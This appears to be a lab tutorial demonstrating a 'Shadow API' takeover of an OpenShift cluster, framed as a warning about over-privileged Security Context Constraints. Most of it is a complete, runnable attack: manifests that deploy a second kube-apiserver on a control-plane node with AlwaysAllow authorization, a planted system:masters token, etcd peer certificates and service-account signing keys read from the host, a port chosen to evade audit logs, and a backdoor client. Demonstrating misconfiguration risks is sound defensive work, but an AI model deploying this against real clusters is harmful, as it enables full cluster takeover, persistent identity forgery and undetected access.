# Total Cluster Takeover via Over-Privileged Misconfiguration

When security controls—specifically **Security Context Constraints (SCCs)** and **Pod Security Admissions (PSAs)** are not strictly enforced, a single misconfiguration can be catastrophic. If a developer or a service account is granted the ability to deploy privileged containers on control plane nodes, the entire cluster’s security model can be dismantled in seconds.

Below is a demonstration of how a "privileged" SCC can be leveraged to create a **Shadow API**, leading to a total cluster takeover while completely bypassing standard auditing logs.

### Security Risk Overview: The "Shadow API" Attack

* **Bypassing RBAC:** By launching a secondary API server with `--authorization-mode=AlwaysAllow`, the attacker effectively deletes the cluster's permission model. Every request is granted "God Mode" regardless of who makes it.
* **Audit Evasion:** The shadow server listens on a non-standard port (**16443**). Because traffic to this port never passes through the official `kube-apiserver` process, no entries are recorded in the official OpenShift audit logs.
* **Real-Time Data Mirroring:** By mounting the host's `etcd` certificates and matching the `etcd-prefix`, the shadow server interacts with the live cluster database. It doesn't just see a copy; it sees and can modify the **actual** cluster state.
* **Identity Theft:** The attacker can use the node's own Service Account signing keys to mint their own identities, making the takeover persistent and difficult to detect.

---

### The End-to-End Lab

To ensure this only runs where it has access to the database certs, we use **nodeSelectors** and **tolerations** to enforce that the Shadow API pod runs strictly on a Control Plane (Master) node.

#### Prerequisites: Create Namespace with Privileged SCC

First, log in as the cluster administrator:

```bash
oc login -u kubeadmin https://api.crc.testing:6443

```

Create the namespace and grant the necessary privileged Security Context Constraints (SCC):

```bash
oc create namespace demo-kube
oc adm policy add-scc-to-user privileged -z default -n demo-kube
oc adm policy add-role-to-user admin developer -n demo-kube
```

Capture the exact production API image and service network range
```
export API_IMAGE=$(oc get pods -n openshift-kube-apiserver -l apiserver=true -o jsonpath='{.items[0].spec.containers[0].image}')
export SERVICE_RANGE=$(oc get networks.config.openshift.io cluster -o jsonpath='{.spec.serviceNetwork[0]}')
```

Switch to the **developer** user to proceed with the bypass as a restricted user:

```bash
oc login -u developer https://api.crc.testing:6443

```

#### Step 1: Automated Lab Deployment

This script captures your cluster's specific API image and network configuration to ensure the "Shadow API" is a perfect binary match.

```bash
# 1. Deploy the Shadow API (The Mirror)
cat <<EOF | oc apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: ocp-shadow-api
  namespace: demo-kube
  labels:
    app: ocp-shadow-api
spec:
  nodeSelector:
    node-role.kubernetes.io/master: ""
  tolerations:
  - key: "node-role.kubernetes.io/master"
    operator: "Exists"
    effect: "NoSchedule"
  - key: "node-role.kubernetes.io/control-plane"
    operator: "Exists"
    effect: "NoSchedule"
  hostNetwork: true
  containers:
  - name: shadow-api
    image: $API_IMAGE
    command: ["/bin/bash", "-c"]
    args:
      - |
        echo "shadow-token,shadow-admin,1000,\"system:masters\"" > /tmp/token-file.csv
        REAL_CA=\$(find /etc/kubernetes/static-pod-resources -name "ca-bundle.crt" | grep "etcd" | head -n 1)
        REAL_CERT=\$(find /etc/kubernetes/static-pod-resources -name "etcd-peer-*.crt" | head -n 1)
        REAL_KEY=\$(echo \$REAL_CERT | sed 's/\.crt/\.key/')
        REAL_SA_KEY=\$(find /etc/kubernetes/static-pod-resources -name "service-account.key" | grep "bound" | head -n 1)
        REAL_SA_PUB=\$(find /etc/kubernetes/static-pod-resources -name "service-account.pub" | grep "bound" | head -n 1)

        exec kube-apiserver \\
          --etcd-servers=https://127.0.0.1:2379 \\
          --etcd-cafile="\$REAL_CA" \\
          --etcd-certfile="\$REAL_CERT" \\
          --etcd-keyfile="\$REAL_KEY" \\
          --etcd-prefix=kubernetes.io \\
          --storage-media-type=application/vnd.kubernetes.protobuf \\
          --secure-port=16443 \\
          --token-auth-file=/tmp/token-file.csv \\
          --authorization-mode=AlwaysAllow \\
          --allow-privileged=true \\
          --service-account-issuer=https://kubernetes.default.svc \\
          --service-account-key-file="\$REAL_SA_PUB" \\
          --service-account-signing-key-file="\$REAL_SA_KEY" \\
          --service-cluster-ip-range=$SERVICE_RANGE
    securityContext:
      privileged: true
    volumeMounts:
    - name: master-resources
      mountPath: /etc/kubernetes/static-pod-resources
      readOnly: true
  volumes:
  - name: master-resources
    hostPath:
      path: /etc/kubernetes/static-pod-resources
EOF

# 2. Deploy Service & Configured Kubeconfig
cat <<EOF | oc apply -f -
apiVersion: v1
kind: Service
metadata:
  name: shadow-api-svc
  namespace: demo-kube
spec:
  selector:
    app: ocp-shadow-api
  ports:
  - protocol: TCP
    port: 443
    targetPort: 16443
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: shadow-kubeconfig
  namespace: demo-kube
data:
  config: |
    apiVersion: v1
    kind: Config
    clusters:
    - cluster:
        insecure-skip-tls-verify: true
        server: https://shadow-api-svc.demo-kube.svc.cluster.local
      name: shadow-cluster
    contexts:
    - context:
        cluster: shadow-cluster
        user: shadow-admin
      name: shadow-context
    current-context: shadow-context
    users:
    - name: shadow-admin
      user:
        token: shadow-token
EOF

# 3. Deploy the Shadow Client
cat <<EOF | oc apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: shadow-client
  namespace: demo-kube
spec:
  containers:
  - name: tools
    image: registry.redhat.io/openshift4/ose-cli-rhel9:latest
    command: ["/bin/sh", "-c", "sleep infinity"]
    env:
    - name: KUBECONFIG
      value: /etc/shadow-config/config
    volumeMounts:
    - name: kubeconfig-vol
      mountPath: /etc/shadow-config
      readOnly: true
  volumes:
  - name: kubeconfig-vol
    configMap:
      name: shadow-kubeconfig
EOF

```

---

### Verification and Demo

1. **Access the Backdoor:** 
```
oc exec -it shadow-client -n demo-kube -- /bin/bash
```

2. **Execute Administrative Actions:** 
```
oc get nodes
oc get namespaces
```

---

### Final Step: Lab Clean Up

Once you have completed the demonstration, delete the namespace and the SCC permissions to ensure the backdoor is closed. You must perform this as **kubeadmin**.

```bash
# Login as cluster admin
oc login -u kubeadmin https://api.crc.testing:6443

# Remove the namespace (this deletes all pods, services, and configmaps)
oc delete namespace demo-kube

# Revoke the privileged SCC from the developer-owned service account
oc adm policy remove-scc-from-user privileged -z default -n demo-kube

```